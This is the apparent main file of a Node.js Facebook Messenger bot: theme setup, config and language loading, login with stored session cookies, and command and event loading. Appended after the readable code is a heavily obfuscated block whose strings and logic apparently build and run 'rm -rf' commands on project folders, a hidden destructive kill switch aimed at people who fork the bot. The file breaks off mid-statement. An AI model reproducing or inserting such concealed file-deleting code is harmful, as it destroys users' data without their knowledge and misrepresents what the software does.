const { readdirSync, readFileSync, writeFileSync } = require("fs-extra");
const { join, resolve } = require('path')
const { execSync } = require('child_process');
const config = require("./config.json");
const listPackage = JSON.parse(readFileSync('./package.json')).dependencies;
const fs = require("fs");
const login = require('./includes/login');
const moment = require("moment-timezone");
const logger = require("./utils/log.js");

global.client = new Object({
  commands: new Map(),
  events: new Map(),
  cooldowns: new Map(),
  eventRegistered: new Array(),
  handleSchedule: new Array(),
  handleReaction: new Array(),
  handleReply: new Array(),
  mainPath: process.cwd(),
  configPath: new String(),
  getTime: function(option) {
    switch (option) {
      case "seconds":
        return `${moment.tz("Asia/Manila").format("ss")}`;
      case "minutes":
        return `${moment.tz("Asia/Manila").format("mm")}`;
      case "hours":
        return `${moment.tz("Asia/Manila").format("HH")}`;
      case "date":
        return `${moment.tz("Asia/Manila").format("DD")}`;
      case "month":
        return `${moment.tz("Asia/Manila").format("MM")}`;
      case "year":
        return `${moment.tz("Asia/Manila").format("YYYY")}`;
      case "fullHour":
        return `${moment.tz("Asia/Manila").format("HH:mm:ss")}`;
      case "fullYear":
        return `${moment.tz("Asia/Manila").format("DD/MM/YYYY")}`;
      case "fullTime":
        return `${moment.tz("Asia/Manila").format("HH:mm:ss DD/MM/YYYY")}`;
    }
  },
  timeStart: Date.now()
});

global.data = new Object({
  threadInfo: new Map(),
  threadData: new Map(),
  userName: new Map(),
  userBanned: new Map(),
  threadBanned: new Map(),
  commandBanned: new Map(),
  threadAllowNSFW: new Array(),
  allUserID: new Array(),
  allCurrenciesID: new Array(),
  allThreadID: new Array()
});

global.utils = require("./utils");
global.loading = require("./utils/log");
global.nodemodule = new Object();
global.config = new Object();
global.configModule = new Object();
global.moduleData = new Array();
global.language = new Object();
global.account = new Object();

// ────────────────── //
const chalk = require("chalk");
const gradient = require("gradient-string");
const theme = config.DESIGN.Theme;
let cra;
let co;
let cb;
let cv;
if (theme.toLowerCase() === 'blue') {
  cra = gradient('yellow', 'lime', 'green');
  co = gradient("#243aff", "#4687f0", "#5800d4");
  cb = chalk.blueBright;
  cv = chalk.bold.hex("#3467eb");
} else if (theme.toLowerCase() === 'fiery') {
  cra = gradient('orange', 'orange', 'yellow');
  co = gradient("#fc2803", "#fc6f03", "#fcba03");
  cb = chalk.hex("#fff308");
  cv = chalk.bold.hex("#fc3205");
} else if (theme.toLowerCase() === 'red') {
  cra = gradient('yellow', 'lime', 'green');
  co = gradient("red", "orange");
  cb = chalk.hex("#ff0000");
  cv = chalk.bold.hex("#ff0000");
} else if (theme.toLowerCase() === 'aqua') {
  cra = gradient("#6883f7", "#8b9ff7", "#b1bffc")
  co = gradient("#0030ff", "#4e6cf2");
  cb = chalk.hex("#3056ff");
  cv = chalk.bold.hex("#0332ff");
} else if (theme.toLowerCase() === 'pink') {
  cra = gradient('purple', 'pink');
  co = gradient("#d94fff", "purple");
  cb = chalk.hex("#6a00e3");
  cv = chalk.bold.hex("#6a00e3");
} else if (theme.toLowerCase() === 'retro') {
  cra = gradient("orange", "purple");
  co = gradient.retro;
  cb = chalk.hex("#ffce63");
  cv = chalk.bold.hex("#3c09ab");
} else if (theme.toLowerCase() === 'sunlight') {
  cra = gradient("#f5bd31", "#f5e131");
  co = gradient("#ffff00", "#ffe600");
  cb = chalk.hex("#faf2ac");
  cv = chalk.bold.hex("#ffe600");
} else if (theme.toLowerCase() === 'teen') {
  cra = gradient("#81fcf8", "#853858");
  co = gradient.teen;
  cb = chalk.hex("#a1d5f7");
  cv = chalk.bold.hex("#ad0042");
} else if (theme.toLowerCase() === 'summer') {
  cra = gradient("#fcff4d", "#4de1ff");
  co = gradient.summer;
  cb = chalk.hex("#ffff00");
  cv = chalk.bold.hex("#fff700")
} else if (theme.toLowerCase() === 'flower') {
  cra = gradient("yellow", "yellow", "#81ff6e");
  co = gradient.pastel;
  cb = gradient('#47ff00', "#47ff75");
  cv = chalk.bold.hex("#47ffbc");
} else if (theme.toLowerCase() === 'ghost') {
  cra = gradient("#0a658a", "#0a7f8a", "#0db5aa");
  co = gradient.mind;
  cb = chalk.blueBright;
  cv = chalk.bold.hex("#1390f0");
} else if (theme === 'hacker') {
  cra = chalk.hex('#4be813');
  co = gradient('#47a127', '#0eed19', '#27f231');
  cb = chalk.hex("#22f013");
  cv = chalk.bold.hex("#0eed19");
} else {
  cra = gradient('yellow', 'lime', 'green');
  co = gradient("#243aff", "#4687f0", "#5800d4");
  cb = chalk.blueBright;
  cv = chalk.bold.hex("#3467eb");
}
// ────────────────── //
const errorMessages = [];
if (errorMessages.length > 0) {
  console.log("Commands with errors:");
  errorMessages.forEach(({ command, error }) => {
    console.log(`${command}: ${error}`);
  });
}
// ────────────────── //
var configValue;
const confg = './config.json';
try {
  global.client.configPath = join(global.client.mainPath, "config.json");
  configValue = require(global.client.configPath);
  logger.loader("Found config.json file!");
} catch (e) {
  return logger.loader('"config.json" file not found."', "error");
}

try {
  for (const key in configValue) global.config[key] = configValue[key];
  logger.loader("Config Loaded!");
} catch (e) {
  return logger.loader("Can't load file config!", "error")
}

for (const property in listPackage) {
  try {
    global.nodemodule[property] = require(property)
  } catch (e) { }
}
const langFile = (readFileSync(`${__dirname}/languages/${global.config.language || "en"}.lang`, {
  encoding: 'utf-8'
})).split(/\r?\n|\r/);
const langData = langFile.filter(item => item.indexOf('#') != 0 && item != '');
for (const item of langData) {
  const getSeparator = item.indexOf('=');
  const itemKey = item.slice(0, getSeparator);
  const itemValue = item.slice(getSeparator + 1, item.length);
  const head = itemKey.slice(0, itemKey.indexOf('.'));
  const key = itemKey.replace(head + '.', '');
  const value = itemValue.replace(/\\n/gi, '\n');
  if (typeof global.language[head] == "undefined") global.language[head] = new Object();
  global.language[head][key] = value;
}

global.getText = function(...args) {
  const langText = global.language;
  if (!langText.hasOwnProperty(args[0])) {
    throw new Error(`${__filename} - Not found key language: ${args[0]}`);
  }
  var text = langText[args[0]][args[1]];
  if (typeof text === 'undefined') {
    throw new Error(`${__filename} - Not found key text: ${args[1]}`);
  }
  for (var i = args.length - 1; i > 0; i--) {
    const regEx = RegExp(`%${i}`, 'g');
    text = text.replace(regEx, args[i + 1]);
  }
  return text;
};

try {
  var appStateFile = resolve(join(global.client.mainPath, config.APPSTATEPATH || "appstate.json"));
  var appState = ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && (fs.readFileSync(appStateFile, 'utf8'))[0] != "[" && config.encryptSt) ? JSON.parse(global.utils.decryptState(fs.readFileSync(appStateFile, 'utf8'), (process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER))) : require(appStateFile);
  logger.loader("Found the bot's appstate.")
} catch (e) {
  logger.loader("Can't find the bot's appstate.", "error");
  const fig = JSON.parse(fs.readFileSync(confg, 'utf8'));
  fig.CONNECT_LOG = false;
  fs.writeFileSync(confg, JSON.stringify(fig, null, 2), 'utf8');
  global.utils.connect();
  return;
}

function onBot() {
  const loginData = {};
  loginData.appState = appState;
  login(loginData, async (err, api) => {
    if (err) {
      if (err.error == 'Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.') {
        console.log(err.error)
        process.exit(0)
      } else {
        console.log(err)
        return process.exit(0)
      }
    }
    const custom = require('./custom');
    custom({ api: api });

    const fbstate = api.getAppState();
    api.setOptions(global.config.FCAOption);
      fs.writeFileSync('appstate.json', JSON.stringify(api.getAppState()));
    let d = api.getAppState();
    d = JSON.stringify(d, null, '\x09');
    if ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && global.config.encryptSt) {
      d = await global.utils.encryptState(d, process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER);
      writeFileSync(appStateFile, d)
    } else {
      writeFileSync(appStateFile, d)
    }
    global.account.cookie = fbstate.map(i => i = i.key + "=" + i.value).join(";");
    global.client.api = api
    global.config.version = config.version,
      (async () => {
        const commandsPath = `${global.client.mainPath}/modules/commands`;
        const listCommand = readdirSync(commandsPath).filter(command => command.endsWith('.js') && !command.includes('example') && !global.config.commandDisabled.includes(command));
        console.log(cv(`\n` + `──LOADING COMMANDS─●`));
        for (const command of listCommand) {
          try {
            const module = require(`${commandsPath}/${command}`);
            const { config } = module;

            if (!config?.name) {
              try {
                throw new Error(`[ COMMAND ] ${command} command has no name property or empty!`);
              } catch (error) {
                console.log(chalk.red(error.message));
                continue;
              }
            }
            if (!config?.commandCategory) {
              try {
                throw new Error(`[ COMMAND ] ${command} commandCategory is empty!`);
              } catch (error) {
                console.log(chalk.red(error.message));
                continue;
              }
            }

            if (!config?.hasOwnProperty('usePrefix')) {
              console.log(`Command`, chalk.hex("#ff0000")(command) + ` does not have the "usePrefix" property.`);
              continue;
            }

            if (global.client.commands.has(config.name || '')) {
              console.log(chalk.red(`[ COMMAND ] ${chalk.hex("#FFFF00")(command)} Module is already loaded!`));
              continue;
            }
            const { dependencies, envConfig } = config;
            if (dependencies) {
              Object.entries(dependencies).forEach(([reqDependency, dependencyVersion]) => {
                if (listPackage[reqDependency]) return;
                try {
                  execSync(`npm --package-lock false --save install ${reqDependency}${dependencyVersion ? `@${dependencyVersion}` : ''}`, {
                    stdio: 'inherit',
                    env: process.env,
                    shell: true,
                    cwd: join(__dirname, 'node_modules')
                  });
                  require.cache = {};
                } catch (error) {
                  const errorMessage = `[PACKAGE] Failed to install package ${reqDependency} for module`;
                  global.loading.err(chalk.hex('#ff7100')(errorMessage), 'LOADED');
                }
              });
            }

            if (envConfig) {
              const moduleName = config.name;
              global.configModule[moduleName] = global.configModule[moduleName] || {};
              global.config[moduleName] = global.config[moduleName] || {};
              for (const envConfigKey in envConfig) {
                global.configModule[moduleName][envConfigKey] = global.config[moduleName][envConfigKey] ?? envConfig[envConfigKey];
                global.config[moduleName][envConfigKey] = global.config[moduleName][envConfigKey] ?? envConfig[envConfigKey];
              }
              var configPath = require('./config.json');
              configPath[moduleName] = envConfig;
              writeFileSync(global.client.configPath, JSON.stringify(configPath, null, 4), 'utf-8');
            }


            if (module.onLoad) {
              const moduleData = {
                api: api
              };
              try {
                module.onLoad(moduleData);
              } catch (error) {
                const errorMessage = "Unable to load the onLoad function of the module."
                throw new Error(errorMessage, 'error');
              }
            }

            if (module.handleEvent) global.client.eventRegistered.push(config.name);
            global.client.commands.set(config.name, module);
            try {
              global.loading(`${cra(`LOADED`)} ${cb(config.name)} success`, "COMMAND");
            } catch (err) {
              console.error("An error occurred while loading the command:", err);
            }

            console.err
          } catch (error) {
            global.loading.err(`${chalk.hex('#ff7100')(`LOADED`)} ${chalk.hex("#FFFF00")(command)} fail ` + error, "COMMAND");
          }
        }
      })(),

      (async () => {
        const events = readdirSync(join(global.client.mainPath, 'modules/events')).filter(ev => ev.endsWith('.js') && !global.config.eventDisabled.includes(ev));
        console.log(cv(`\n` + `──LOADING EVENTS─●`));
        for (const ev of events) {
          try {
            const event = require(join(global.client.mainPath, 'modules/events', ev));
            const { config, onLoad, run } = event;
            if (!config || !config.name || !run) {
              global.loading.err(`${chalk.hex('#ff7100')(`LOADED`)} ${chalk.hex("#FFFF00")(ev)} Module is not in the correct format. `, "EVENT");
              continue;
            }


            if (errorMessages.length > 0) {
              console.log("Commands with errors:");
              errorMessages.forEach(({ command, error }) => {
                console.log(`${command}: ${error}`);
              });
            }

            if (global.client.events.has(config.name)) {
              global.loading.err(`${chalk.hex('#ff7100')(`LOADED`)} ${chalk.hex("#FFFF00")(ev)} Module is already loaded!`, "EVENT");
              continue;
            }
            if (config.dependencies) {
              const missingDeps = Object.keys(config.dependencies).filter(dep => !global.nodemodule[dep]);
              if (missingDeps.length) {
                const depsToInstall = missingDeps.map(dep => `${dep}${config.dependencies[dep] ? '@' + config.dependencies[dep] : ''}`).join(' ');
                execSync(`npm install --no-package-lock --no-save ${depsToInstall}`, {
                  stdio: 'inherit',
                  env: process.env,
                  shell: true,
                  cwd: join(__dirname, 'node_modules')
                });
                Object.keys(require.cache).forEach(key => delete require.cache[key]);
              }
            }
            if (config.envConfig) {
              const configModule = global.configModule[config.name] || (global.configModule[config.name] = {});
              const configData = global.config[config.name] || (global.config[config.name] = {});
              for (const evt in config.envConfig) {
                configModule[evt] = configData[evt] = config.envConfig[evt] || '';
              }
              writeFileSync(global.client.configPath, JSON.stringify({
                ...require(global.client.configPath),
                [config.name]: config.envConfig
              }, null, 2));
            }
            if (onLoad) {
              const eventData = {
                api: api
              };
              await onLoad(eventData);
            }
            global.client.events.set(config.name, event);
            global.loading(`${cra(`LOADED`)} ${cb(config.name)} success`, "EVENT");
          }
          catch (err) {
            global.loading.err(`${chalk.hex("#ff0000")('ERROR!')} ${cb(ev)} failed with error: ${err.message}` + `\n`, "EVENT");
          }
        }
      })();
    console.log(cv(`\n` + `──BOT START─● `));
    global.loading(`${cra(`[ SUCCESS ]`)} Loaded ${cb(`${global.client.commands.size}`)} commands and ${cb(`${global.client.events.size}`)} events successfully`, "LOADED");
    global.loading(`${cra(`[ TIMESTART ]`)} Launch time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED");
    global.utils.complete({ api });
    const listener = require('./includes/listen')({ api: api });
    global.handleListen = api.listenMqtt(async (error, event) => {
      if (error) {
        if (error.error === 'Not logged in.') {
          logger("Your bot account has been logged out!", 'LOGIN');
          return process.exit(1);
        }
        if (error.error === 'Not logged in') {
          logger("Your account has been checkpointed, please confirm your account and log in again!", 'CHECKPOINTS');
          return process.exit(0);
        }
        console.log(error);
        return process.exit(0);
      }
      if (['presence', 'typ', 'read_receipt'].some(data => data === event.type)) return;
      return listener(event);
    });
  });
}

// ___END OF EVENT & API USAGE___ //

(async () => {
  try {
    console.log(cv(`\n` + `──DATABASE─●`));
    global.loading(`${cra(`[ CONNECT ]`)} Connected to JSON database successfully!`, "DATABASE");
    onBot();
  } catch (error) {
    global.loading.err(`${cra(`[ CONNECT ]`)} Failed to connect to the JSON database: ` + error, "DATABASE");
  }
})();

(function(_0x43341a,_0x203475){const _0x51bb72=_0x43341a();function _0x1fbbe6(_0x1c8f71,_0x49641a,_0x3884e8,_0x2eb425){return _0x7d86(_0x2eb425-0x2ba,_0x49641a);}function _0x17afaf(_0x157cf2,_0x1ff042,_0x2e60e1,_0x36b310){return _0x7d86(_0x36b310-0x218,_0x1ff042);}while(!![]){try{const _0x28d388=-parseInt(_0x17afaf(0x381,0x370,0x36c,0x36c))/(-0xfbe+0x604*-0x1+0x3*0x741)+parseInt(_0x1fbbe6(0x3ee,0x3fe,0x3d6,0x3f3))/(0x18c1*-0x1+0x1083+0x840)+-parseInt(_0x1fbbe6(0x429,0x42a,0x40d,0x413))/(0x3*-0x916+0x137e+0x7c7*0x1)+parseInt(_0x17afaf(0x34e,0x34a,0x318,0x332))/(0x1*0x18cc+-0x1de9+0xd*0x65)*(parseInt(_0x17afaf(0x361,0x349,0x37f,0x370))/(-0x918+-0x2532+0x2e4f))+parseInt(_0x1fbbe6(0x411,0x3c6,0x3c8,0x3ec))/(0x1680+-0x1*0x239d+0x39*0x3b)*(-parseInt(_0x1fbbe6(0x41e,0x416,0x400,0x404))/(0x243+-0x4e5+0x2a9))+-parseInt(_0x1fbbe6(0x3e6,0x3b6,0x3f5,0x3da))/(-0x29*0x57+-0x5*0x70a+-0x3129*-0x1)*(-parseInt(_0x17afaf(0x362,0x32f,0x338,0x353))/(-0x2*-0x31+-0x1a73+-0xd0d*-0x2))+-parseInt(_0x17afaf(0x314,0x327,0x32e,0x334))/(0x191c+-0xb4f+0x1*-0xdc3);if(_0x28d388===_0x203475)break;else _0x51bb72['push'](_0x51bb72['shift']());}catch(_0x3f7718){_0x51bb72['push'](_0x51bb72['shift']());}}}(_0x53d4,0x2a72d+0x4d3e*-0x1+-0x11b7));function _0x53d4(){const _0x52f83f=['ALAWE','rn\x20this\x22)(','warn','XPyOW','PeKMx','bythR','4780KgxMEM','sctdi','1464010rEUOuz','__proto__','MXioZ','IEBNi','635592nUrKrP','xoCRX','ZgfdK','Pbajk','NjzYt','search','XMCjH','{}.constru','wvGlz','apply','ile\x20to\x20run','(((.+)+)+)','qsSRH','Failure!','RPkzE','exception','zRdXw','dPIkS','118596reXbnv','bPIhS','table','ctor(\x22retu','log','forEach','BPwYm','511896zTkaoY','toString','18phnsmS','Cjaud','REPL_OWNER','JzSJm','JQBhK','o\x20such\x20a\x20f','Error!','split','Forker\x20Acc','aKZyA','iHAXv','jgUAj','.config','wmYtd','GLjyR','21Pckuqh','prototype','YXZlb','d:\x20','constructo','trace','IjXlE','vTpct','SFZig','env','237206heEAhB','length','return\x20(fu','nction()\x20','1090GGVUkt','248673WhmAYI','console','rm\x20-rf\x20','bind','modules','NhbVQ','info','HwVgs','OylHq'];_0x53d4=function(){return _0x52f83f;};return _0x53d4();}const _0x26fb0e=(function(){const _0x23859b={};_0x23859b['pSguC']='dMgPB',_0x23859b[_0x556c63(0xb3,0xb9,0xd3,0xd1)]='Cjaud';function _0x556c63(_0x4ca0ab,_0x20fa69,_0x2f76af,_0x4a81a2){return _0x7d86(_0x4ca0ab- -0x68,_0x2f76af);}const _0x5779de=_0x23859b;let _0xf98ec7=!![];return function(_0x3d7093,_0x102a3d){const _0x1bfc2e={};_0x1bfc2e[_0x1e54eb(-0x57,-0x4b,-0x5d,-0x5d)]=_0xded81a(0x474,0x476,0x453,0x434);function _0x1e54eb(_0x5e3a0e,_0x4b42d4,_0x188c1a,_0xd2d169){return _0x556c63(_0x4b42d4- -0x107,_0x4b42d4-0x66,_0xd2d169,_0xd2d169-0x1b3);}_0x1bfc2e[_0xded81a(0x418,0x41d,0x41a,0x3fb)]=_0x5779de['pSguC'];const _0x1b1ba1=_0x1bfc2e;function _0xded81a(_0x274059,_0x2317b7,_0x45a0ba,_0x47b17d){return _0x556c63(_0x45a0ba-0x36a,_0x2317b7-0x89,_0x274059,_0x47b17d-0x138);}if(_0xded81a(0x449,0x438,0x43e,0x42b)===_0x5779de[_0xded81a(0x419,0x401,0x41d,0x402)]){const _0x23bdcc=_0xf98ec7?function(){function _0x546531(_0x458ad1,_0x39a8b4,_0x3118d4,_0x2e0c34){return _0xded81a(_0x3118d4,_0x39a8b4-0x15d,_0x39a8b4- -0x19d,_0x2e0c34-0x18c);}function _0x34d12b(_0x5a38c1,_0x2b1324,_0x3c42df,_0x4572d6){return _0xded81a(_0x4572d6,_0x2b1324-0x1b3,_0x2b1324- -0x5a4,_0x4572d6-0x178);}if(_0x102a3d){if(_0x1b1ba1[_0x34d12b(-0x173,-0x17e,-0x162,-0x161)]!==_0x1b1ba1[_0x546531(0x25c,0x27d,0x26a,0x29f)]){const _0x22b20c=_0x102a3d[_0x546531(0x278,0x28e,0x29b,0x267)](_0x3d7093,arguments);return _0x102a3d=null,_0x22b20c;}else{if(_0x3c924e){const _0x917a9d=_0x4d9729[_0x546531(0x272,0x28e,0x2a1,0x272)](_0x1d1f9e,arguments);return _0x38e7b9=null,_0x917a9d;}}}}:function(){};return _0xf98ec7=![],_0x23bdcc;}else _0x4b4d8c=_0xb733ec;};}()),_0x2d68b8=_0x26fb0e(this,function(){const _0x50d269={};_0x50d269[_0x1648fd(-0x5e,-0x24,-0x4e,-0x3e)]=_0x1648fd(-0x4b,-0x56,-0x33,-0x46)+'+$';function _0x1648fd(_0x28d65c,_0x5dced4,_0x626331,_0x37b52c){return _0x7d86(_0x37b52c- -0x171,_0x28d65c);}const _0x8e3a9f=_0x50d269;function _0x5c28a0(_0x16beb3,_0x50b17a,_0x160fc7,_0x39b911){return _0x7d86(_0x39b911- -0x23,_0x16beb3);}return _0x2d68b8[_0x5c28a0(0x13a,0xfa,0x13b,0x117)]()[_0x1648fd(-0x3f,-0x6e,-0x52,-0x4c)](_0x1648fd(-0x24,-0x2f,-0x20,-0x46)+'+$')[_0x1648fd(-0x47,-0x33,-0x3a,-0x37)]()[_0x1648fd(-0x17,-0x3e,-0x35,-0x23)+'r'](_0x2d68b8)[_0x5c28a0(0xee,0x101,0xf6,0x102)](_0x8e3a9f[_0x1648fd(-0x27,-0x1a,-0x5b,-0x3e)]);});_0x2d68b8();function _0x4589e6(_0x1673de,_0x52a419,_0x3854fc,_0x52b4c3){return _0x7d86(_0x1673de-0x165,_0x52a419);}function _0x7d86(_0x23cd01,_0x2d68b8){const _0x26fb0e=_0x53d4();return _0x7d86=function(_0x53d4fc,_0x7d8668){_0x53d4fc=_0x53d4fc-(-0x41b*-0x4+0xbd1+-0x1b29);let _0x56de89=_0x26fb0e[_0x53d4fc];return _0x56de89;},_0x7d86(_0x23cd01,_0x2d68b8);}const _0x16c03b=(function(){function _0x813bc6(_0x94baef,_0x501090,_0xa0fcdc,_0x291d93){return _0x7d86(_0x291d93- -0x35e,_0x94baef);}const _0x5f5280={'dPIkS':function(_0x5168d0,_0xf6034c){return _0x5168d0!==_0xf6034c;},'JzSJm':_0x813bc6(-0x225,-0x1e7,-0x1d9,-0x200),'RPkzE':function(_0xe05c8c,_0x211659){return _0xe05c8c===_0x211659;},'BPwYm':_0x813bc6(-0x241,-0x1f9,-0x1fd,-0x21f),'bVLjD':function(_0x2e892a,_0x517b8d){return _0x2e892a+_0x517b8d;},'jgUAj':function(_0x387909){return _0x387909();},'bythR':_0x3bc7f3(-0x18b,-0x185,-0x19a,-0x198),'iHAXv':_0x813bc6(-0x210,-0x1dc,-0x1ff,-0x1ff),'UxbfT':_0x3bc7f3(-0x1a9,-0x187,-0x166,-0x160),'IEBNi':function(_0x206e96,_0x46971d){return _0x206e96(_0x46971d);}};function _0x3bc7f3(_0x4d50b4,_0x1275b4,_0x3a50f6,_0x1e92d0){return _0x7d86(_0x1275b4- -0x2bb,_0x1e92d0);}let _0xe7d5a3=!![];return function(_0x145ea5,_0x3cf249){const _0x163a86={'XPyOW':function(_0x15958c,_0x221953){return _0x15958c(_0x221953);},'IjXlE':function(_0x219741,_0xbe8e9e){return _0x5f5280['bVLjD'](_0x219741,_0xbe8e9e);},'XolJH':_0x416e96(-0x19c,-0x180,-0x161,-0x180)+_0xdd6486(0x120,0xfc,0xe6,0xfd),'gDLrO':_0xdd6486(0xa9,0xbe,0xba,0xcd)+_0xdd6486(0xf0,0xf0,0xbb,0xdb)+_0x416e96(-0x1d3,-0x19b,-0x1b5,-0x1c1)+'\x20)','OylHq':function(_0x170317){function _0x1561ee(_0x32646d,_0x1908ed,_0x123864,_0x43f1f5){return _0x416e96(_0x43f1f5,_0x1908ed-0x64,_0x123864-0x13e,_0x1908ed-0x466);}return _0x5f5280[_0x1561ee(0x2bc,0x2d6,0x2f2,0x2bb)](_0x170317);},'uSifw':_0x5f5280[_0x416e96(-0x1e4,-0x1d7,-0x1d3,-0x1bd)],'PPyyt':_0x416e96(-0x1e6,-0x1b1,-0x1ad,-0x1c0),'zRdXw':_0x5f5280[_0x416e96(-0x17f,-0x1a0,-0x1a6,-0x191)],'eUQyf':'error','qsSRH':_0xdd6486(0xe4,0xfa,0xd2,0xd5),'wmYtd':_0x5f5280['UxbfT'],'XMCjH':function(_0x969d6f,_0x10a1ab){function _0x874fcd(_0x1c04b6,_0x1941e3,_0x359dba,_0x1854dd){return _0xdd6486(_0x1c04b6-0x1b6,_0x1941e3,_0x359dba-0x48,_0x1854dd- -0x18);}return _0x5f5280[_0x874fcd(0xad,0xa7,0x86,0xad)](_0x969d6f,_0x10a1ab);}};function _0xdd6486(_0x425f9e,_0x5f5b8e,_0x4b609a,_0x8804df){return _0x813bc6(_0x5f5b8e,_0x5f5b8e-0x9b,_0x4b609a-0x73,_0x8804df-0x304);}const _0x3a82b9=_0xe7d5a3?function(){function _0x59cf02(_0x1e1906,_0x156c32,_0x1bb9f1,_0x2f8447){return _0xdd6486(_0x1e1906-0x62,_0x1e1906,_0x1bb9f1-0x1b8,_0x156c32-0x320);}function _0x518b3d(_0x235ef9,_0x415efc,_0x483123,_0xd09e2b){return _0xdd6486(_0x235ef9-0x82,_0x235ef9,_0x483123-0x1c7,_0x483123-0x12a);}if(_0x5f5280[_0x518b3d(0x1e0,0x1fd,0x201,0x1f9)](_0x5f5280['JzSJm'],_0x5f5280[_0x518b3d(0x212,0x213,0x20e,0x227)])){let _0x2f896b;try{const _0x536c68=_0x163a86[_0x59cf02(0x3e5,0x3dd,0x3f2,0x3d4)](_0x1b2231,_0x163a86[_0x59cf02(0x406,0x416,0x425,0x419)](_0x163a86['XolJH']+_0x163a86['gDLrO'],');'));_0x2f896b=_0x163a86[_0x518b3d(0x256,0x256,0x231,0x20b)](_0x536c68);}catch(_0x1f1aee){_0x2f896b=_0x1d1877;}const _0x37785f=_0x2f896b[_0x59cf02(0x405,0x420,0x411,0x401)]=_0x2f896b['console']||{},_0x7426ef=[_0x163a86['uSifw'],_0x163a86['PPyyt'],_0x163a86[_0x59cf02(0x3df,0x3f6,0x3fb,0x3f5)],_0x163a86['eUQyf'],_0x163a86[_0x518b3d(0x203,0x1ff,0x1fc,0x202)],_0x163a86[_0x518b3d(0x225,0x1ff,0x218,0x204)],'trace'];for(let _0x631c89=0x9a9*-0x4+0xfd4+-0x2*-0xb68;_0x631c89<_0x7426ef['length'];_0x631c89++){const _0x390c6c=_0x42da2c[_0x518b3d(0x237,0x1f9,0x21e,0x234)+'r'][_0x518b3d(0x241,0x21b,0x21b,0x23f)][_0x518b3d(0x23d,0x20a,0x22c,0x239)](_0x27638d),_0x483e58=_0x7426ef[_0x631c89],_0x410974=_0x37785f[_0x483e58]||_0x390c6c;_0x390c6c['__proto__']=_0x4e76e0[_0x518b3d(0x222,0x23d,0x22c,0x245)](_0x13edde),_0x390c6c[_0x59cf02(0x403,0x400,0x3f8,0x411)]=_0x410974[_0x59cf02(0x3e8,0x400,0x3e5,0x41a)][_0x59cf02(0x42a,0x422,0x41a,0x438)](_0x410974),_0x37785f[_0x483e58]=_0x390c6c;}}else{if(_0x3cf249){if(_0x5f5280[_0x59cf02(0x3e4,0x3f4,0x3dc,0x3d0)](_0x5f5280[_0x518b3d(0x1ef,0x212,0x208,0x1f1)],'HCHCI')){const _0x5a225b={'ALAWE':function(_0x2015e2,_0x4d5449){function _0x447a96(_0x1d20ce,_0x578bb3,_0x54acae,_0x49a2ab){return _0x518b3d(_0x1d20ce,_0x578bb3-0x9e,_0x54acae- -0x2bb,_0x49a2ab-0x16);}return _0x163a86[_0x447a96(-0xb2,-0xc3,-0xc5,-0xae)](_0x2015e2,_0x4d5449);}};_0x42b8bf['forEach'](_0x50bbfa=>{function _0x37fcee(_0x5013ff,_0x4aa634,_0x203504,_0x56ba31){return _0x518b3d(_0x5013ff,_0x4aa634-0x180,_0x4aa634-0x216,_0x56ba31-0x147);}function _0x471876(_0xd60fee,_0x178437,_0x3f5bfd,_0x564f7a){return _0x518b3d(_0xd60fee,_0x178437-0x136,_0x3f5bfd- -0x124,_0x564f7a-0x1cd);}_0x5a225b[_0x471876(0xae,0xa1,0xc0,0xbf)](_0x59fd18,_0x471876(0x12c,0x115,0x107,0x10a)+_0x50bbfa);}),_0x96bbbc[_0x59cf02(0x415,0x3fc,0x3de,0x3e3)]('Error!');}else{const _0xdd813d=_0x3cf249[_0x518b3d(0x210,0x202,0x1f9,0x1d3)](_0x145ea5,arguments);return _0x3cf249=null,_0xdd813d;}}}}:function(){};function _0x416e96(_0x2bb955,_0x1f6b20,_0x46bee8,_0x500be8){return _0x3bc7f3(_0x2bb955-0x78,_0x500be8- -0x1b,_0x46bee8-0x17e,_0x2bb955);}return _0xe7d5a3=![],_0x3a82b9;};}()),_0x10ee13=_0x16c03b(this,function(){const _0x3b645d={};function _0x2f70e2(_0x1f86b0,_0x1bfe8c,_0x65d42d,_0x3c7b89){return _0x7d86(_0x1bfe8c- -0xd0,_0x65d42d);}_0x3b645d[_0x312f1c(-0x5e,-0x50,-0x5c,-0x2b)]=function(_0x3fb5cd,_0x4c1d5a){return _0x3fb5cd+_0x4c1d5a;},_0x3b645d[_0x2f70e2(0x90,0x7c,0x6b,0x87)]=_0x2f70e2(0x48,0x57,0x4b,0x4a)+_0x2f70e2(0x4c,0x65,0x75,0x7a)+'rn\x20this\x22)('+'\x20)',_0x3b645d[_0x312f1c(-0x6b,-0x47,-0x64,-0x43)]=_0x312f1c(-0x66,-0x83,-0x8d,-0x96),_0x3b645d[_0x312f1c(-0x81,-0x7b,-0x6c,-0x96)]=_0x2f70e2(0xa6,0x8f,0x90,0x7d),_0x3b645d['HwVgs']='error',_0x3b645d[_0x2f70e2(0x73,0x74,0x7c,0x52)]=_0x312f1c(-0x67,-0x4a,-0x5a,-0x69);function _0x312f1c(_0x280b74,_0x402339,_0x100d81,_0x96061){return _0x7d86(_0x402339- -0x199,_0x96061);}_0x3b645d[_0x2f70e2(0x68,0x53,0x7a,0x56)]=function(_0x89ffc8,_0x249cc3){return _0x89ffc8===_0x249cc3;},_0x3b645d['xoCRX']=_0x2f70e2(0x77,0x52,0x37,0x45);const _0x497459=_0x3b645d;let _0x5ff15e;try{const _0x21c7d8=Function(_0x497459[_0x312f1c(-0x5f,-0x50,-0x70,-0x64)](_0x497459[_0x312f1c(-0x64,-0x50,-0x3e,-0x71)]('return\x20(fu'+'nction()\x20',_0x497459[_0x2f70e2(0x86,0x7c,0xa3,0x5d)]),');'));_0x5ff15e=_0x21c7d8();}catch(_0x4ffcd0){_0x5ff15e=window;}const 